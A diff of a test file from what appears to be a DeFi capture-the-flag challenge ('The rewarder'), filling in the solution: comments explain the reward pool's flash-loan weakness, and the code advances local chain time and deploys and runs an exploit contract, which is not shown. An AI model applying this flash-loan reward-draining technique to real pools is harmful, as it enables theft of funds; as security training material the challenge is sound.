@@ -65,11 +65,20 @@ describe('[Challenge] The rewarder', function () {
         expect(await liquidityToken.balanceOf(player.address)).to.eq(0);
         
         // Two rounds must have occurred so far
+        // Because deposit() also triggers the rewards
         expect(await rewarderPool.roundNumber()).to.be.eq(2);
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // RewarderPool is vulnerable because there is no forced waiting time between a deposit and a withdraw
+        // making it weak to flash loans abuse
+
+        // Advance time 5 days again
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        Exploit = await (await ethers.getContractFactory('ExploitRewarder', player)).deploy(liquidityToken.address, rewardToken.address, flashLoanPool.address, rewarderPool.address);
+
+        // Run exploit
+        await Exploit.exploit(TOKENS_IN_LENDER_POOL);
     });
 
     after(async function () {
